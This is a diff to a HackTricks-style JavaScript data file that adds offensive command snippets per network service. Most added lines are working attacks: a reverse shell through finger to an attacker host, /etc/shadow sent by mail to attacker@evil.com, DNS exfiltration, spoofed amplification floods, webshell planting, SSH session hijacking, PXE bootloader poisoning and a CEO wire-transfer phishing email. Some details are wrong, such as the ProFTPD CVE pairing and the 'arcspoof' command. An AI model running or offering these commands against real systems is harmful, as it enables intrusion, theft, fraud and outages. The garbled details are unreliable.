@@ -4648,17 +4648,25 @@ var HACKTRICKS_DATA = {
       "enumeration": [
         "nmap -sU -sT -p 7 <IP>",
         "nc -uvn <IP> 7",
-        "echo 'hello' | nc -w1 <IP> 7"
+        "echo 'hello' | nc -w1 <IP> 7",
+        "# Detect if both TCP and UDP echo are enabled\nnmap -p T:7,U:7 -sT -sU --open <IP>",
+        "# Fingerprint via response delay\ntime echo 'AAAA' | nc -w1 <IP> 7"
       ],
       "exploitation": [
         "# UDP Echo amplification between two misconfigured hosts\n# Send forged UDP packet from host A to host B both running echo\nnc -u <HOST_B> 7 <<< 'AAAA'  # triggers loop if HOST_A also echoes",
-        "# Echo flood\nhping3 -2 -p 7 --flood <IP>"
+        "# Echo flood\nhping3 -2 -p 7 --flood <IP>",
+        "# UDP Echo amplification DDoS: spoof source IP to victim, send to echo server\n# hping3 spoofed UDP to echo (source=victim, dest=echo server)\nhping3 -2 -p 7 --spoof <VICTIM_IP> --data 1400 --flood <IP>",
+        "# Blind SSRF probe via echo: inject request into networked echo server\necho -e 'GET / HTTP/1.0\\r\\n' | nc -w2 <IP> 7  # if HTTP-aware echo"
       ],
       "post_exploitation": [
-        "# Echo loop between two misconfigured hosts \u2192 CPU DoS\nnc -u host1 7 | nc -u host2 7"
+        "# Echo loop between two misconfigured hosts → CPU DoS\nnc -u host1 7 | nc -u host2 7",
+        "# Persistent echo loop as covert channel between two compromised hosts\n# On host A: nc -u <HOST_B> 7 | while read l; do echo \"$l\" | nc -u <HOST_C> 7; done",
+        "# Use echo service to measure latency and map internal network topology\nfor ip in $(seq 1 254); do (time echo 'A' | nc -w1 192.168.1.$ip 7) 2>&1 | grep real; done"
       ],
       "other": [
-        "# Echo loop DoS test (use carefully in lab only)\necho 'A'*65000 | nc -w1 <IP> 7"
+        "# Echo loop DoS test (use carefully in lab only)\necho 'A'*65000 | nc -w1 <IP> 7",
+        "# Confirm running service version via banner (inetd vs custom)\nnc -vn <IP> 7 2>&1 | head -5",
+        "# Check if firewall allows forged UDP echo (amplification prereq)\nhping3 -2 -p 7 -c 3 <IP> && echo 'UDP echo open'"
       ]
     }
   },
@@ -4671,7 +4679,10 @@ var HACKTRICKS_DATA = {
         "nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=rockyou.txt <IP>",
         "ftp <IP>  # anonymous:anonymous",
         "nc -vn <IP> 21",
-        "openssl s_client -connect <IP>:21 -starttls ftp"
+        "openssl s_client -connect <IP>:21 -starttls ftp",
+        "# Enumerate all FTP scripts available in nmap\nnmap -p 21 --script 'ftp-*' <IP>",
+        "# Check FEAT command for supported extensions\nnc <IP> 21\nFEAT",
+        "# Identify FTP server type via banner\ncurl -sI ftp://<IP> 2>&1 | head -5"
       ],
       "exploitation": [
         "# FTP Bounce scan\nnmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>\nnmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>",
@@ -4681,18 +4692,26 @@ var HACKTRICKS_DATA = {
         "# Misconfigured write access\nftp <IP>\nput /etc/passwd passwd_upload",
         "# FTPS explicit TLS\ncurl -v --ftp-ssl ftp://user:pass@<IP>/",
         "# Directory traversal\nftp <IP>\ncd ../../../etc\nget passwd",
-        "# PASV misconfiguration - connects to arbitrary IP\n# Test: compare PASV response IP with server IP\nnc <IP> 21\nPASV  # if returns different IP, PASV injection possible"
+        "# PASV misconfiguration - connects to arbitrary IP\n# Test: compare PASV response IP with server IP\nnc <IP> 21\nPASV  # if returns different IP, PASV injection possible",
+        "# FTP credential spray using harvested usernames\nhydra -L /tmp/users.txt -P /tmp/pass.txt -t 8 -f ftp://<IP> -V",
+        "# Exploit writable anonymous FTP to plant webshell (if web root is shared)\nftp <IP>\ncd /var/www/html\nput /tmp/shell.php shell.php",
+        "# FTP over TLS (FTPS) - downgrade test\ncurl --ftp-ssl-reqd ftp://user:pass@<IP>/  # fails if server downgrades",
+        "# CVE-2011-2523 – ProFTPD 1.3.3c backdoor (port 6200 shell)\nnc <IP> 21\nSITE CPFR /etc/passwd\nSITE CPTO /tmp/out\n# Also triggers reverse shell on some builds"
       ],
       "post_exploitation": [
         "# Grab readable files after login\nftp <IP>\nmget *",
         "# Check for .netrc credentials\ncat ~/.netrc",
         "cat /etc/vsftpd.conf 2>/dev/null | grep -iE 'anon\\|write\\|chroot\\|pass'",
         "find / -name 'ftpusers' -o -name 'vsftpd.log' 2>/dev/null",
-        "find /var/ftp /srv/ftp /home/ftp -type f 2>/dev/null | xargs strings | grep -iE 'password\\|pass\\|secret'"
+        "find /var/ftp /srv/ftp /home/ftp -type f 2>/dev/null | xargs strings | grep -iE 'password\\|pass\\|secret'",
+        "# Search FTP root for credentials and configs\ngrep -rE 'password|passwd|secret|key' /var/ftp/ /srv/ftp/ 2>/dev/null",
+        "# Check if FTP home dir overlaps with web root for webshell persistence\ncat /etc/vsftpd.conf | grep 'local_root\\|anon_root'",
+        "# Dump xferlog for file transfer history\ncat /var/log/vsftpd.log | grep -E 'UPLOAD|DOWNLOAD'"
       ],
       "other": [
         "# Anonymous login check\nftp -n <IP> 21 <<EOF\nquote USER anonymous\nquote PASS test@test.com\nls\nEOF",
-        "# FTPS explicit\ncurl -v --ftp-ssl ftp://user:pass@<IP>/"
+        "# FTPS explicit\ncurl -v --ftp-ssl ftp://user:pass@<IP>/",
+        "# Test for PASV mode SSRF (server opens TCP to attacker-specified IP:port)\nnc <IP> 21\nPASV  # note response IP:port\n# If different from server IP, server may open connections to arbitrary hosts"
       ]
     }
   },
@@ -4705,7 +4724,9 @@ var HACKTRICKS_DATA = {
         "ssh-audit <IP>",
         "nc -vn <IP> 22",
         "ssh-keyscan -t rsa,ecdsa,ed25519 <IP>",
-        "python3 ssh-audit.py <IP>"
+        "python3 ssh-audit.py <IP>",
+        "# Banner grab and algorithm enumeration\nssh -vvv -o BatchMode=yes <IP> 2>&1 | grep -E 'kex|host key|cipher|mac'",
+        "# Detect weak host key algorithms\nnmap -p 22 --script ssh2-enum-algos <IP> | grep -E 'diffie-hellman-group1|arcfour|3des'"
       ],
       "exploitation": [
         "hydra -L users.txt -P passwords.txt ssh://<IP> -t 4",
@@ -4719,7 +4740,11 @@ var HACKTRICKS_DATA = {
         "# ProxyJump lateral movement through bastion\nssh -J user@<BASTION> user@<INTERNAL_HOST>",
         "# SSH tunneling for port forward\nssh -L 5432:internal_db:5432 user@<IP>  # local forward\nssh -R 2222:localhost:22 user@<IP>      # reverse tunnel",
         "# CVE-2023-38408 - ssh-agent remote code execution\n# Trigger via: ssh -A to attacker-controlled server with malicious agent",
-        "# Authorized_keys world-writable check\nls -la ~/.ssh/authorized_keys\nfind / -name 'authorized_keys' -perm -o+w 2>/dev/null"
+        "# Authorized_keys world-writable check\nls -la ~/.ssh/authorized_keys\nfind / -name 'authorized_keys' -perm -o+w 2>/dev/null",
+        "# SSH agent hijacking – steal forwarded agent socket from another user session\n# Find another user's SSH_AUTH_SOCK\nfor s in /tmp/ssh-*/agent.*; do SSH_AUTH_SOCK=$s ssh-add -l 2>/dev/null && echo \"Got: $s\"; done",
+        "# SSH multiplexing persistence – establish hidden ControlMaster socket\nssh -M -S /tmp/.ctrl -o ControlPersist=24h user@<IP> -N &\n# Later reuse without auth:\nssh -S /tmp/.ctrl user@<IP>",
+        "# Harvest known_hosts for network topology (hashed or plain)\nssh-keyscan -H -f /tmp/targets.txt 2>/dev/null >> ~/.ssh/known_hosts\ncat ~/.ssh/known_hosts | grep -v '|' # plain text hostnames",
+        "# CVE-2023-38408 – ssh-agent PKCS#11 RCE\n# Requires: malicious server + victim uses ssh -A forwarding\n# PoC: load crafted .so via ssh-agent PKCS11Provider"
       ],
       "post_exploitation": [
         "# Enumerate SSH config after shell access\ncat /etc/ssh/sshd_config",
@@ -4729,12 +4754,18 @@ var HACKTRICKS_DATA = {
         "cat /etc/ssh/sshd_config | grep -iE 'PasswordAuthentication\\|PermitRootLogin\\|AuthorizedKeysFile'",
         "find /home /root -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null",
         "cat /etc/ssh/ssh_known_hosts ~/.ssh/known_hosts 2>/dev/null  # map internal hosts",
-        "last -a | head -20  # recent SSH logins"
+        "last -a | head -20  # recent SSH logins",
+        "# Hijack active SSH PTY sessions via /proc/fd\n# Find SSH process and its pts\nls -la /proc/$(pgrep -u target_user sshd)/fd | grep pts\n# Attach:\nscript -q /dev/null -c 'cat /proc/<pid>/fd/<pty_fd>'",
+        "# Exfil via SSH covert channel – encapsulate data in SSH keepalive\n# Use 'sshhiccup' or custom script with ClientAliveInterval",
+        "# Persistence via authorized_keys in non-standard AuthorizedKeysFile path\ngrep AuthorizedKeysFile /etc/ssh/sshd_config  # may be /etc/ssh/authorized_keys/%u\necho '<PUBKEY>' >> /etc/ssh/authorized_keys/root",
+        "# Steal SSH host private key for MITM\ncat /etc/ssh/ssh_host_rsa_key /etc/ssh/ssh_host_ed25519_key"
       ],
       "other": [
         "# Local port forward\nssh -L <local_port>:<remote_host>:<remote_port> user@<IP>",
         "# Dynamic SOCKS proxy\nssh -D 1080 user@<IP>",
-        "# Remote port forward\nssh -R <remote_port>:localhost:<local_port> user@<IP>"
+        "# Remote port forward\nssh -R <remote_port>:localhost:<local_port> user@<IP>",
+        "# SOCKS5 proxy via SSH for full internal network pivoting\nssh -D 9050 -fNq user@<IP>\nproxychains4 nmap -sT -Pn -p 80,443,8080 192.168.1.0/24",
+        "# VPN-style tunnel with tun interface (requires root on both ends)\nssh -w 0:0 root@<IP>\n# On server: ip addr add 10.99.99.1/30 dev tun0 && ip link set tun0 up\n# On client: ip addr add 10.99.99.2/30 dev tun0 && ip link set tun0 up"
       ]
     }
   },
@@ -4745,22 +4776,31 @@ var HACKTRICKS_DATA = {
       "enumeration": [
         "nmap -n -sV -Pn --script 'telnet-ntlm-info or telnet-encryption' -p 23 <IP>",
         "nc -vn <IP> 23",
-        "nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=pass.txt <IP>"
+        "nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=pass.txt <IP>",
+        "# Detect telnet with version-specific banner grab\nnmap -sV -p 23 --script telnet-ntlm-info,banner <IP>",
+        "# Check for Cisco IOS telnet (no authentication = critical)\necho -e '\\r\\n' | nc -w3 <IP> 23 | grep -iE 'cisco|ios|router|switch|#|>'"
       ],
       "exploitation": [
         "hydra -L users.txt -P rockyou.txt -t 4 -f telnet://<IP>",
         "ncrack -p 23 --user admin -P common-pass.txt --connection-limit 4 <IP>",
         "medusa -M telnet -h <IP> -U users.txt -P passwords.txt -t 6 -f",
-        "# Telnet USER env injection (some BSD inetd)\nUSER='-f root' telnet -a <IP>"
+        "# Telnet USER env injection (some BSD inetd)\nUSER='-f root' telnet -a <IP>",
+        "# Telnet credential spray against network devices\nfor cred in admin:admin cisco:cisco enable:enable; do\n  u=${cred%%:*}; p=${cred##*:}\n  (echo -e \"$u\\r\\n$p\\r\\nshow version\\r\\nexit\\r\\n\" | nc -w3 <IP> 23) 2>/dev/null | grep -i 'version\\|IOS' && echo \"VALID: $u:$p\"\ndone",
+        "# Credential capture via ARP spoofing + tcpdump on LAN segment\narcspoof -i eth0 -t <VICTIM> <GATEWAY> &\ntcpdump -i eth0 -A 'tcp port 23' -w telnet_caps.pcap",
+        "# MITM telnet session with ettercap\nettercap -T -q -i eth0 -M arp // // -F telnet_inject.ef"
       ],
       "post_exploitation": [
         "cat /etc/inetd.conf /etc/xinetd.d/telnet 2>/dev/null",
         "# Grab cleartext creds from pcap\ntshark -r telnet.pcap -Y 'telnet' -T fields -e data.text",
-        "history  # telnet sessions leave command history"
+        "history  # telnet sessions leave command history",
+        "# After Cisco IOS telnet shell: dump full config including password hashes\ntelnet <IP>\nenable\nshow running-config\ncopy running-config tftp  # exfil to TFTP server\n# Crack type 7 passwords:\npython3 -c \"import base64; enc='<TYPE7_HASH>'; key='dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg8h3;'; print(''.join(chr(ord(key[(i+2*int(enc[:2],16))%53])^int(enc[2:][i*2:i*2+2],16)) for i in range((len(enc)-2)//2)))\"",
+        "# On network device: enumerate SNMP community via telnet config view\nshow snmp community\nshow ip route  # dump routing table for lateral movement mapping"
       ],
       "other": [
         "sudo tcpdump -i eth0 -A 'tcp port 23'  # capture cleartext creds",
-        "cat /etc/inetd.conf\ncat /etc/xinetd.d/telnet"
+        "cat /etc/inetd.conf\ncat /etc/xinetd.d/telnet",
+        "# Automated credential testing for Cisco devices\nnmap -p 23 --script telnet-brute --script-args userdb=cisco-users.txt,passdb=cisco-pass.txt <IP>",
+        "# Strip telnet IAC negotiation for clean session capture\ntcpdump -r telnet_caps.pcap -A | grep -v 'IAC\\|WILL\\|WONT\\|DO\\|DONT' | strings"
       ]
     }
   },
@@ -4775,7 +4815,9 @@ var HACKTRICKS_DATA = {
         "smtp-user-enum -M VRFY -U users.txt -t <IP>",
         "smtp-user-enum -M EXPN -U users.txt -t <IP>",
         "smtp-user-enum -M RCPT -U users.txt -t <IP> -D domain.com",
-        "swaks --to target@domain.com --from test@test.com --server <IP>"
+        "swaks --to target@domain.com --from test@test.com --server <IP>",
+        "# Test SMTP smuggling with LF-only line endings\nopenssl s_client -connect <IP>:25 -crlf -quiet\n# Then send: DATA\\nFrom: test@test.com\\nTo: target@domain.com\\nSubject: test\\n.\\n",
+        "# Enumerate all EHLO extensions\nnc <IP> 25\nEHLO attacker.com"
       ],
       "exploitation": [
         "# SMTP relay test\nswaks --to victim@external.com --from spoof@internal.com --server <IP>",
@@ -4786,17 +4828,25 @@ var HACKTRICKS_DATA = {
         "# STARTTLS stripping\nswaks --server <IP> --port 25 --tls-on-connect  # check if STARTTLS required",
         "# SMTP header injection\nswaks --to 'victim@domain.com%0ACc:attacker@evil.com' --server <IP>",
         "# SPF/DKIM bypass - send from internal server\nswaks --from 'ceo@<TARGET_DOMAIN>' --to 'employee@<TARGET_DOMAIN>' --server <IP>",
-        "# Test for open relay\nswaks --from 'test@external.com' --to 'target@external.com' --server <IP>"
+        "# Test for open relay\nswaks --from 'test@external.com' --to 'target@external.com' --server <IP>",
+        "# SMTP Smuggling (CVE-2023-51766 class) – inject messages via inconsistent EOL handling\n# Postfix/Exim disagree on <LF>.<LF> vs <CRLF>.<CRLF> terminators\nswaks --server <IP> --to victim@domain.com --from spoof@domain.com \\\n  --body $'From: spoofed@domain.com\\nTo: victim@domain.com\\nSubject: Smuggled\\n\\nContent\\n.'",
+        "# Phishing via authenticated relay with harvested credentials\nswaks --auth LOGIN --auth-user user@domain.com --auth-password 'P@ssw0rd' \\\n  --server <IP> --to exec@target.com --from ceo@target.com \\\n  --header 'Subject: Urgent Wire Transfer' --body 'Please process $50k to account 1234'",
+        "# AUTH PLAIN brute force\nfor cred in admin:admin user:password; do\n  u=${cred%%:*}; p=${cred##*:}\n  B64=$(python3 -c \"import base64; print(base64.b64encode(b'\\\\x00${u}\\\\x00${p}').decode())\")\n  echo -e \"AUTH PLAIN $B64\" | nc -w3 <IP> 25 | grep '235\\|535'\ndone"
       ],
       "post_exploitation": [
         "# Dump all mail after auth\ncurl -u user:pass 'imaps://<IP>/INBOX?ALL'",
         "# Find stored mail on disk\nfind /var/mail /var/spool/mail -type f 2>/dev/null",
         "# Exfil via SMTP after shell\ncat /etc/shadow | sendmail attacker@evil.com",
-        "# Check postfix config for relay hosts and credentials\ncat /etc/postfix/main.cf\ncat /etc/postfix/sasl_passwd"
+        "# Check postfix config for relay hosts and credentials\ncat /etc/postfix/main.cf\ncat /etc/postfix/sasl_passwd",
+        "# Exfiltrate data by encoding in email body via local sendmail\ncat /etc/shadow | base64 | mail -s 'exfil' attacker@evil.com",
+        "# Enumerate all mailboxes via postfix\npostmap -q - hash:/etc/postfix/virtual < /dev/null 2>/dev/null\ncat /etc/postfix/virtual_mailbox_maps 2>/dev/null",
+        "# Read queued mail from spool\nls /var/spool/postfix/deferred/ /var/spool/postfix/active/\npostcat /var/spool/postfix/deferred/<QUEUEID>"
       ],
       "other": [
         "# Manual enumeration\nnc <IP> 25\nEHLO test\nVRFY root\nEXPN staff",
-        "# Send test email\nswaks --to user@domain --server <IP> --from attacker@evil.com --body 'test'"
+        "# Send test email\nswaks --to user@domain --server <IP> --from attacker@evil.com --body 'test'",
+        "# Test DMARC/DKIM bypass: send mail with aligned From but mismatched envelope\nswaks --to victim@target.com --from-header 'From: ceo@target.com' \\\n  --from 'attacker@evil.com' --server <IP>",
+        "# Harvest email addresses via RCPT TO spraying\nfor user in $(cat users.txt); do echo \"RCPT TO:<${user}@domain.com>\" | nc -w2 <IP> 25 | grep '250\\|550'; done"
       ]
     }
   },
@@ -4830,17 +4880,27 @@ var HACKTRICKS_DATA = {
     "categories": {
       "enumeration": [
         "nmap -p 49 -sV <IP>",
-        "nmap -p 49 --script tacacs-brute <IP>"
+        "nmap -p 49 --script tacacs-brute <IP>",
+        "# Identify TACACS+ with raw probe\npython3 -c \"\nimport socket, struct\ns = socket.socket()\ns.connect(('<IP>', 49))\n# TACACS+ auth start packet (version 0xc1, type 0x01)\npkt = bytes([0xc1,0x01,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00])\ns.send(pkt); print(s.recv(512).hex())\n\"",
+        "# Nmap service detection\nnmap -p 49 -sV -sC --script tacacs-brute <IP>"
       ],
       "exploitation": [
         "sudo loki_gtk.py",
-        "# TACACS+ auth brute\nnmap -p 49 --script tacacs-brute --script-args brute.firstonly=true <IP>"
+        "# TACACS+ auth brute\nnmap -p 49 --script tacacs-brute --script-args brute.firstonly=true <IP>",
+        "# TACACS+ key brute force with Loki toolkit\nsudo python2 loki.py -i <INTERFACE> --tacacs-brute -f /usr/share/wordlists/rockyou.txt",
+        "# MITM TACACS+ session on L2 network\n# ARP spoof between NAS and TACACS server, capture shared key\narcspoof -i eth0 -t <NAS_IP> <TACACS_SERVER_IP> &\ntcpdump -i eth0 -w tacacs.pcap 'tcp port 49'",
+        "# Once shared key known: decrypt TACACS+ session with Wireshark\n# Edit -> Preferences -> Protocols -> TACACS+ -> Key",
+        "# Forge TACACS+ auth response (if key known) to bypass network device auth\npython3 tacacs_forge.py --key <SHARED_KEY> --server <IP> --user admin --accept"
       ],
       "post_exploitation": [
-        "# Dump TACACS+ config after device compromise\nshow running-config | include tacacs\ncat /etc/tacacs+/tac_plus.conf 2>/dev/null"
+        "# Dump TACACS+ config after device compromise\nshow running-config | include tacacs\ncat /etc/tacacs+/tac_plus.conf 2>/dev/null",
+        "# After gaining TACACS+ server access: dump all device credentials\ncat /etc/tacacs+/tac_plus.conf | grep -E 'key|secret|password|user'",
+        "# Enumerate all TACACS+ clients (network devices) from server config\ngrep 'client\\|host' /etc/tacacs+/tac_plus.conf | awk '{print $2}'",
+        "# Replay captured TACACS+ auth to authenticate to managed devices\n# Use extracted key + forged responses in controlled test environment"
       ],
       "other": [
-        "# TACACS+ MitM with Loki\n# Install: apt install loki"
+        "# TACACS+ MitM with Loki\n# Install: apt install loki",
+        "# TACACS+ vs RADIUS: TACACS+ encrypts entire body; RADIUS only encrypts password field\n# TACACS+ runs over TCP 49; RADIUS over UDP 1812/1813\n# Both can be cracked if shared key is weak"
       ]
     }
   },
@@ -4859,7 +4919,10 @@ var HACKTRICKS_DATA = {
         "dnsenum --dnsserver <IP> --enum -p 0 -s 0 -f subdomains-1000.txt <DOMAIN>",
         "fierce --domain <DOMAIN> --dns-servers <IP>",
         "dig -t _ldap._tcp.<DOMAIN> @<IP>",
-        "dig -t _kerberos._tcp.<DOMAIN> @<IP>"
+        "dig -t _kerberos._tcp.<DOMAIN> @<IP>",
+        "# Enumerate all DNS record types for target domain\nfor t in A AAAA MX NS SOA TXT SRV PTR CNAME DNSKEY TLSA CAA; do\n  dig @<IP> <DOMAIN> $t +short 2>/dev/null && echo \"[$t]\"\ndone",
+        "# NSEC/NSEC3 zone walking\nldns-walk @<IP> <DOMAIN>",
+        "# AXFR zone transfer attempt\ndig axfr @<IP> <DOMAIN>"
       ],
       "exploitation": [
         "# DNS cache poisoning test\npython3 dns_spoof.py --target <IP> --domain victim.com --spoof 1.2.3.4",
@@ -4869,16 +4932,26 @@ var HACKTRICKS_DATA = {
         "# Subdomain takeover check\nfor sub in $(cat subdomains.txt); do dig +short $sub.<DOMAIN> @<IP> | grep -q 'NXDOMAIN' && echo \"Potential takeover: $sub\"; done",
         "# DNS rebinding\nnmap -sU -p 53 --script dns-recursion <IP>",
         "# Zone walking with NSEC\nnmap -sU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=<DOMAIN> <IP>",
-        "# DNS over HTTPS probe\ncurl -H 'accept: application/dns-json' 'https://<IP>/dns-query?name=<DOMAIN>&type=A'"
+        "# DNS over HTTPS probe\ncurl -H 'accept: application/dns-json' 'https://<IP>/dns-query?name=<DOMAIN>&type=A'",
+        "# DNS cache poisoning test (Kaminsky attack simulation)\n# Requires open recursive resolver + predictable TXID\npython3 dns_kaminsky.py --target <IP> --domain victim.com --attacker-ns evil.com",
+        "# DNS rebinding attack – register domain that resolves to 127.0.0.1 after TTL 0\n# Use rbndr.us or singularity for automated rebinding\ncurl http://$(python3 -c \"print('7f000001.c0a80101.rbndr.us')\"):8080/internal",
+        "# DNS over TCP amplification via ANY query\ndig @<IP> . ANY +notcp  # fails = TCP fallback available\ndig @<IP> <DOMAIN> ANY  # large response for amplification",
+        "# DNS tunneling for C2 channel\n# Server side:\ndnscat2 --dns server=<DNS_SERVER>,domain=<DOMAIN> --secret=<KEY>\n# Client side (post-exploit):\ndnscat2-powershell -DNSserver <ATTACKER_IP> -Domain <DOMAIN> -PreSharedSecret <KEY>",
+        "# Sub-domain takeover: check CNAME pointing to unclaimed cloud service\ndig <SUBDOMAIN>.<DOMAIN> CNAME\n# If CNAME points to *.azurewebsites.net / *.s3.amazonaws.com with no bucket:\ncurl -s https://subdomain-takeover-scanner.com/check?domain=<SUBDOMAIN>"
       ],
       "post_exploitation": [
         "cat /etc/bind/named.conf",
         "cat /etc/resolv.conf",
-        "cat /etc/bind/named.conf.local"
+        "cat /etc/bind/named.conf.local",
+        "# Internal DNS pivoting: use compromised DNS to resolve internal hostnames\ndig @<INTERNAL_DNS_IP> internal.corp.local A +short",
+        "# Exfiltrate data via DNS TXT queries (16KB per query)\nfor chunk in $(echo 'sensitive_data' | base64 | fold -w 60); do\n  dig @<ATTACKER_NS> ${chunk}.exfil.attacker.com TXT\ndone",
+        "# Enumerate AD via DNS SRV records\ndig @<IP> _ldap._tcp.dc._msdcs.<DOMAIN> SRV\ndig @<IP> _kerberos._tcp.<DOMAIN> SRV"
       ],
       "other": [
         "nslookup\n> SERVER <IP>\n> 127.0.0.1\n> <DOMAIN>",
-        "msfconsole -q -x 'use auxiliary/gather/enum_dns; set RHOSTS <IP>; run; exit'"
+        "msfconsole -q -x 'use auxiliary/gather/enum_dns; set RHOSTS <IP>; run; exit'",
+        "# Check for DNSSEC misconfiguration\ndig @<IP> <DOMAIN> DNSKEY +dnssec\ndig @<IP> <DOMAIN> DS",
+        "# DNS amplification factor test\npython3 -c \"import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(b'\\xaa\\xbb\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\x00\\x01', ('<IP>',53)); print(len(s.recv(4096)), 'bytes')\""
       ]
     }
   },
@@ -4889,18 +4962,26 @@ var HACKTRICKS_DATA = {
       "enumeration": [
         "nmap -n -Pn -sU -p 69 -sV --script tftp-enum <IP>",
         "msf5> use auxiliary/admin/tftp/tftp_transfer_util",
-        "nmap -sU -p 69 <IP>"
+        "nmap -sU -p 69 <IP>",
+        "# Automated wordlist-based file enumeration\nfor f in $(cat /usr/share/seclists/Discovery/TFTP/tftp-common.txt); do\n  tftp <IP> -c get $f /tmp/tftp_${f//\\//_} 2>/dev/null && echo \"HIT: $f\"\ndone",
+        "# Detect TFTP with Metasploit file enumerator\nmsf> use auxiliary/scanner/tftp/tftpbrute\nset RHOSTS <IP>; set FILELIST /usr/share/metasploit-framework/data/wordlists/tftp.txt; run"
       ],
       "exploitation": [
         "# Attempt common config file download\ntftp <IP>\nget /etc/passwd\nget /etc/shadow\nget /boot/grub/grub.cfg\nget /etc/cisco/running-config",
-        "# Python TFTP client\nimport tftpy\nclient = tftpy.TftpClient('<IP>', 69)\nclient.download('filename', '/tmp/out', timeout=5)\nclient.upload('payload', '/local/payload', timeout=5)"
+        "# Python TFTP client\nimport tftpy\nclient = tftpy.TftpClient('<IP>', 69)\nclient.download('filename', '/tmp/out', timeout=5)\nclient.upload('payload', '/local/payload', timeout=5)",
+        "# Upload malicious firmware/config to TFTP server (writable TFTP)\ntftp <IP>\nput /tmp/malicious.conf startup-config",
+        "# Download Cisco/Juniper running configs (common TFTP paths)\nfor conf in startup-config running-config nvram:startup-config flash:startup-config; do\n  tftp -g -r $conf -l /tmp/tftp_$conf <IP> 2>/dev/null && echo \"Got: $conf\"\ndone",
+        "# Network boot hijack: if PXE/TFTP used for netboot, upload poisoned bootloader\ntftp <IP>\nput /tmp/pxelinux.0 pxelinux.0  # replaces legitimate PXE bootloader"
       ],
       "post_exploitation": [
         "# Enumerate network device configs downloaded via TFTP\nstrings /tmp/tftp_dump | grep -iE 'password|enable|secret|community'",
-        "find /var/lib/tftpboot /tftpboot -type f 2>/dev/null"
+        "find /var/lib/tftpboot /tftpboot -type f 2>/dev/null",
+        "# Parse recovered Cisco config for credentials\ncat /tmp/tftp_running-config | grep -E 'username|password|secret|community|key'\n# Decrypt type 7 Cisco passwords:\npython3 -c \"\nenc='<TYPE7>'; key='dsfd;kfoA,.iyewrkldJKDHSUBsgvca69834ncxv9873254k;fg8h3;'\nprint(''.join(chr(ord(key[(i+2*int(enc[:2],16))%53])^int(enc[2:][i*2:i*2+2],16)) for i in range((len(enc)-2)//2)))\n\"",
+        "# Map network topology from recovered config\ngrep -E 'ip route|neighbor|router' /tmp/tftp_running-config"
       ],
       "other": [
-        "# Enumerate readable files via wordlist\nfor f in $(cat tftp-files.txt); do tftp <IP> -c get $f /tmp/$f 2>/dev/null && echo \"Found: $f\"; done"
+        "# Enumerate readable files via wordlist\nfor f in $(cat tftp-files.txt); do tftp <IP> -c get $f /tmp/$f 2>/dev/null && echo \"Found: $f\"; done",
+        "# TFTP has no authentication – any file in tftproot is world-readable/writable\n# Common tftproot: /var/lib/tftpboot  /tftpboot  /srv/tftp\nls /var/lib/tftpboot 2>/dev/null; ls /tftpboot 2>/dev/null"
       ]
     }
   },
@@ -4913,18 +4994,28 @@ var HACKTRICKS_DATA = {
         "finger @<IP>",
         "finger root@<IP>",
         "finger-user-enum.pl -U users.txt -t <IP>",
-        "printf '\\r\\n' | nc -vn <IP> 79"
+        "printf '\\r\\n' | nc -vn <IP> 79",
+        "# Enumerate all logged-in users\nfinger @<IP>",
+        "# Enumerate specific usernames from wordlist\nfor u in root admin oracle www-data; do finger $u@<IP> 2>/dev/null | grep -v 'no such user'; done",
+        "# Detect if finger daemon is in.fingerd with command injection potential\nnc -vn <IP> 79\nroot"
       ],
       "exploitation": [
         "# Command injection via finger\nfinger '|/bin/id@<IP>'",
         "finger '|/bin/ls -a /@<IP>'",
-        "msf> use auxiliary/scanner/finger/finger_users"
+        "msf> use auxiliary/scanner/finger/finger_users",
+        "# Command injection via piped input (older SunOS/BSD finger)\nfinger '|/bin/sh -i >& /dev/tcp/<ATTACKER>/4444 0>&1'@<IP>",
+        "# Morris Worm-style fingerd exploitation (historical reference, CVE-1988)\n# Overflow the gets() buffer in in.fingerd to execute shellcode\n# Modern: check for CVE equivalents in embedded device finger implementations",
+        "# Use finger to enumerate users for downstream brute force\nfinger @<IP> | awk '{print $1}' | grep -v Login > finger_users.txt\nhydra -L finger_users.txt -P rockyou.txt ssh://<IP>"
       ],
       "post_exploitation": [
-        "# Finger output reveals login times and TTY - use for session correlation\nfinger -l @<IP> | grep -E 'Login|Name|Directory|Shell|Last login'"
+        "# Finger output reveals login times and TTY - use for session correlation\nfinger -l @<IP> | grep -E 'Login|Name|Directory|Shell|Last login'",
+        "# Correlate finger output with active sessions for targeted lateral movement\nfinger @<IP> | grep -E '\\*|pts' | awk '{print $1, $5}'  # active tty = logged in now",
+        "# Use plan/project files revealed by finger for social engineering\nfinger -l admin@<IP> | grep -A5 'Plan:\\|Project:'"
       ],
       "other": [
-        "# Finger bounce\nfinger user@host@<IP>"
+        "# Finger bounce\nfinger user@host@<IP>",
+        "# Finger daemon logs – check for audit trail after exploitation\ncat /var/log/syslog | grep fingerd",
+        "# Check .forward file (can be used to execute commands via mail delivery)\nfinger root@<IP>  # may reveal home directory\n# Then: cat /root/.forward"
       ]
     }
   },
@@ -4943,7 +5034,9 @@ var HACKTRICKS_DATA = {
         "feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/common.txt",
         "nikto -h http://<IP>",
         "wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://<IP>/FUZZ",
-        "wafw00f http://<IP>"
+        "wafw00f http://<IP>",
+        "# Technology fingerprinting stack\nwhatweb -a 3 http://<IP>\ncurl -sI http://<IP> | grep -E 'Server:|X-Powered-By:|X-AspNet:|Set-Cookie:'",
+        "# Virtual host brute force (cloud/shared hosting)\nffuf -u http://<IP>/ -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403"
       ],
       "exploitation": [
         "# SQLi scan\nsqlmap -u 'http://<IP>/page?id=1' --dbs",
